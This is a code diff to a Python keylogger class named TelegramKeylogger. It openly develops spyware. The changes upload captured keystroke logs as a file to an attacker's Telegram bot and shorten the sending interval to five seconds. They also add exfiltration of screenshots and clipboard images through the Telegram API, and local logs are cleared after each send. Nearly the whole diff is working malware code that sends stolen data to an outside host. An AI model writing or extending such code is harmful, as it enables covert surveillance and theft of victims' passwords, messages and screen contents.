@@ -13,7 +13,7 @@ class TelegramKeylogger:
     def __init__(self):
         self.bot_token = os.getenv('BOT_TOKEN')
         self.chat_id = os.getenv('CHAT_ID')
-        self.send_interval = int(os.getenv('SEND_INTERVAL', 20))
+        self.send_interval = int(os.getenv('SEND_INTERVAL', 5))
         self.is_running = True
         self.last_send_time = time.time()
 
@@ -28,34 +28,42 @@ class TelegramKeylogger:
             if not log_content.strip():
                 return False
 
-            message = f"Keylogger Report ({time.strftime('%H:%M:%S')}):\n```\n{log_content}\n```"
+            timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
+            filename = f"logfile_{timestamp}.txt"
 
-            url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
-            payload = {
-                'chat_id': self.chat_id,
-                'text': message,
-                'parse_mode': 'Markdown'
-            }
+            file_data = io.BytesIO(log_content.encode('utf-8'))
+            file_data.name = filename
 
-            response = requests.post(url, data=payload, timeout=30)
+            url = f"https://api.telegram.org/bot{self.bot_token}/sendDocument"
+
+            files = {'document': (filename, file_data, 'text/plain')}
+            data = {'chat_id': self.chat_id, 'caption': f'Keylogger Report ({time.strftime("%H:%M:%S")})'}
+
+            response = requests.post(url, files=files, data=data, timeout=30)
 
             if response.status_code == 200:
                 open(f'C:/Users/{username}/OneDrive/Desktop/logfile.txt', 'w').close()
                 return True
             else:
+                open("logfile.txt", 'w').close()
                 print(f"Telegram API error: {response.status_code}")
                 return False
 
         except Exception as e:
+            open("logfile.txt", 'w').close()
             print(f"Send error: {e}")
             return False
 
-    def _send_photo(self, image_data):
+    def _send_photo(self, image, name):
+        image_data = io.BytesIO()
+        image.save(image_data, format='PNG')
+        image_data.seek(0)
+
         url = f"https://api.telegram.org/bot{self.bot_token}/sendPhoto"
 
-        caption = f"Screenshot ({time.strftime('%H:%M:%S')})"
+        caption = f"{name} ({time.strftime('%H:%M:%S')})"
 
-        files = {'photo': ('screenshot.png', image_data, 'image/png')}
+        files = {'photo': (f'{name}.png', image_data, 'image/png')}
         data = {'chat_id': self.chat_id, 'caption': caption}
 
         response = requests.post(url, files=files, data=data, timeout=30)
@@ -68,13 +76,18 @@ class TelegramKeylogger:
 
     def send_screenshot(self, screenshot_image):
         try:
-            img_byte_arr = io.BytesIO()
-            screenshot_image.save(img_byte_arr, format='PNG')
-            img_byte_arr.seek(0)
+            return self._send_photo(screenshot_image, "Screenshot")
 
-            return self._send_photo(img_byte_arr)
         except Exception as e:
             print(f"Screenshot send error: {e}")
+            return False
+
+    def send_clipboard_image(self, image):
+        try:
+            return self._send_photo(image, "Clipboard_image")
+
+        except Exception as e:
+            print(f"Clipboard image send error: {e}")
             return False
 
     def auto_send_loop(self):
